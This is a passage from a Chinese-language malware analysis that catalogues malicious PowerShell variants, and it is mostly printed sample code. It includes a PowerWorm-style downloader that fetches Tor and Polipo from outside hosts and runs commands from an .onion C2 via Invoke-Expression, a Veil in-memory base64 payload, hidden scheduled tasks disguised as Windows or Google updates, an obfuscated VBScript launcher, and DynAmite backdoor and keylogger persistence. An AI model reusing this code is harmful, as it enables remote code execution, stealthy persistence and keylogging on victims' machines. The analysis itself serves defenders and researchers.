    $ke.NameSpace($sa).CopyHere($ei, 20);
    rd $tg;
    };
    $sa = $env:APPDATA + '' + $kn;
    if (!(Test-Path $sa)){;
    $qr = New-Item -ItemType Directory -Force -Path $sa;
    $qr.Attributes = "Hidden", "System", "NotContentIndexed";
    };
    $zul=$sa+ 'tor.exe';
    $axs=$sa+ 'polipo.exe';
    $tg=$sa+''+$kn+'.zip';
    $ovg=New-Object System.Net.WebClient;
    $ke=New-Object -C Shell.Application;
    if (!(Test-Path $zul) -or !(Test-Path $axs)){;
    e 'i.vankin.de';
    };
    if (!(Test-Path $zul) -or !(Test-Path $axs)){;
    e 'gg.ibiz.cc';
    };
    $pj=$sa+'roaminglog';
    saps $zul -Ar " --Log `"notice file $pj`"" -wi Hidden;
    do{
    sleep 1;
    $xxl=gc $pj
    } while(!($xxl -match 'Bootstrapped 100%: Done.'));
    saps $axs -a "socksParentProxy=localhost:9050" -wi Hidden;
    sleep 7;
    $zpp=New-Object System.Net.WebProxy("localhost:8123");
    $zpp.useDefaultCredentials = $true;
    $ovg.proxy=$zpp;
    $ca='http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;mom=&amp;uid=' + $kn;
    while(!$qmh){
    $qmh=$ovg.downloadString($ca)
    };
    if ($qmh -ne 'none'){;
    iex $qmh;
    };
该代码通过请求DNS TXT记录获取软件的URL下载地址，从该地址下载Tor和Polipo，利用这些软件持续请求传递给Invoke-Expression的新的PowerShell命令。Matt
Graeber在分析这类恶意软件的全部功能方面做了非常出色的研究工作，给出了软件底层PowerShell代码的去混淆和注释版本。
**4.19 Veil Stream（7个样本，占比0.17%）**
此类变种使用的技术与“Powerfun Reverse”变种类似，将bae64字符串中的PowerShell代码插入内存，使用Invoke-Expression执行真正的shellcode载荷。代码的结构与Veil框架对应。
    Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
**（三）本地持久化类别**
此类PowerShell代码的主要目的是实现宿主机的本地持久化。
**4.20 Scheduled Task COM（11个变量，占比0.27%）**
此类变种创建计划任务运行恶意二进制文件以实现持久化机制。样本中使用的PE文件来自于所下载的“minicraft.exe”，通过下面所示的PowerShell代码执行。之所以这么做可能是因为使用PowerShell比使用原始下载二进制代码更容易完成这一任务。
代码所用到的技术与之前的Retefe银行木马有关。
    $TaskName = "Microsoft Windows Driver Update"
    $TaskDescr = "Microsoft Windows Driver Update Services"
    $TaskCommand = "C:ProgramDataWindowsUpgrademinecraft.exe"
    $TaskScript = ""
    $TaskArg = ""
    $TaskStartTime = [datetime]::Now.AddMinutes(1)
    $service = new-object -ComObject("Schedule.Service")
    $service.Connect()
    $rootFolder = $service.GetFolder("")
    $TaskDefinition = $service.NewTask(0)
    $TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
    $TaskDefinition.Settings.Enabled = $true
    $TaskDefinition.Settings.Hidden = $true
    $TaskDefinition.Settings.RestartCount = "5"
    $TaskDefinition.Settings.StartWhenAvailable = $true
    $TaskDefinition.Settings.StopIfGoingOnBatteries = $false
    $TaskDefinition.Settings.RestartInterval = "PT5M"
    $triggers = $TaskDefinition.Triggers
    $trigger = $triggers.Create(8)
    $trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
    $trigger.Enabled = $true
    $trigger.Repetition.Interval = "PT5M"
    $TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
    $Action = $TaskDefinition.Actions.Create(0)
    $action.Path = "$TaskCommand"
    $action.Arguments = "$TaskArg"
    $rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
    SCHTASKS /run /TN $TaskName
**4.21 VB Task（10个样本，占比0.24%）**
此类PowerShell代码最初来自于某个内嵌PowerShell脚本的PE文件，通过运行VB脚本来创建计划任务。VB脚本一旦执行就会启动另一个PowerShell脚本。
    $path= "$env:userprofileappdatalocalmicrosoftWindows"
    if(-not(Test-Path -Path($path)))
    {mkdir $path}
    $fileout="$pathL69742.vbs";
    $encstrvbs="c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K";
    $bytevbs=[System.Convert]::FromBase64String($encstrvbs);
    $strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
    $strvbs = $strvbs.replace('#dpath#',$path);
    set-content $fileout $strvbs;
    $tmpfile="$env:TEMPU1848931.TMP";
    $pscode_b64  =get-content $tmpfile | out-string;
    $pscode_b64=$pscode_b64.trim();
    $pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
    $id = [string](get-random -min 10000 -max 100000)
    $pscode = $pscode.replace('#id#',$id);
    set-content "$pathmc.ps1" $pscode
    $taskstr="schtasks /create /F /sc minute /mo 2 /tn ""GoogleServiceUpdate"" /tr """"$fileout""""   ";
    iex 'cmd /c $taskstr';
    {{CODE}}
    The base64 decoded VBScript –
    {{CODE}}
    set wss = CreateObject("WScript.Shell")
    str = "power" &amp; "sh" &amp; "ell" &amp; ".e" &amp; "xe -NoP -sta -NonI -e" &amp; "xe" &amp; "c byp" &amp; "as" &amp; "s -fi" &amp; "le "
    path = "#dpath#"
    str = str + path + "mc.ps1"
    wss.Run str, 0
**4.22 DynAmite Launcher （6个样本，占比0.15%）**
**4.23 DynAmite KL（1个样本，占比0.02%）**
DynAmite是一个“恶意软件生成工具包”，可以根据用户定制功能，创建恶意软件。
DynAmite允许用户组合他们所需要的功能，生成一个PE封装文件，利用PowerShell命令执行所定制的任务。我所收集到的此类代码主要来自于公开工具，其中变量名和变量位置可以有多种不同表现。
“DynAmite
Launcher”变种通过计划任务完成本地持久化目的。以下是此类变种的三种不同表现形式，这三种样本可能由DynAmite使用不同的版本和配置生成。
    schtasks.exe /create /TN "MicrosoftWindowsDynAmiteBackdoor" /XML C:WindowsTemptask.xml
    schtasks.exe /create /TN "MicrosoftWindowsDynAmiteKeylogger" /XML C:WindowsTemptask2.xml
    SCHTASKS /run /TN "MicrosoftWindowsDynAmiteBackdoor"
    SCHTASKS /run /TN "MicrosoftWindowsDynAmiteKeylogger"
    Remove-Item "C:WindowsTemp*.xml"
    #create backdoor task
    schtasks.exe /create /TN "MicrosoftWindowsDynAmiteDynAmite" /XML C:WindowsTempdynatask.xml
    #create upload task
    schtasks.exe /create /TN "MicrosoftWindowsDynAmiteUploader" /XML C:WindowsTempupltask.xml
    #run backdoor task
    SCHTASKS /run /TN "MicrosoftWindowsDynAmiteDynAmite"
    #create registry entries for keylogger and screenspy
    New-ItemProperty -path HKLM:SOFTWAREMicrosoftWindowsCurrentVersionRun -Name Keylogger -PropertyType String -Value "C:Windowsdynakey.exe"